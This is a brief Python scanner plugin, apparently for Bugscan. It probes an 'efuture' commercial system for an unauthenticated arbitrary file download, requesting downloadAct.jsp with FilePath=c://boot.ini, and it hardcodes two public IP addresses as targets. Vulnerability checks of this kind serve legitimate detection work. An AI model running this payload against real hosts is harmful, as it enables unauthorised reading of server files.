#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:京富基融通科技商业链系统任意文件下载（无须登录）
#Refer:http://www.wooyun.org/bugs/wooyun-2014-066881

def assign(service,arg):
    if service=="efuture":
        return True,arg 
    


def  audit(arg):

    url=arg+"web/login/downloadAct.jsp?FilePath=c://boot.ini&name=boot.ini"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and '[boot loader]' in res:
            security_hole(url)

if __name__=="__main__":
    from dummy import *

    audit(assign('efuture','http://222.91.146.26:8088/')[1])
    audit(assign('efuture','http://61.175.246.14:8088/')[1])